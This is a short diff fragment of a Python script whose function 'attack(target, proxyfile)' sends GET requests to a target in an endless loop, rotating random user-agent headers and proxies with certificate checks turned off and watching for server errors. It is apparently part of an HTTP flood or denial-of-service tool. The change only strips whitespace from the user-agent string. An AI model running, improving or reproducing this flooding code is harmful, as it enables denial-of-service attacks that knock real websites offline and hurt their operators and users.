@@ -69,7 +69,7 @@ def attack(target, proxyfile):
         r = 0
         while True:
             r += 1
-            headers = {'user-agent': random.choice(headers_useragents)}
+            headers = {'user-agent': random.choice(headers_useragents).strip()}
             proxies = {'http': proxyfile,'https': proxyfile}
             req = requests.get(target, headers=headers, proxies=proxies, verify=False)
             if req.status_code >= 500:
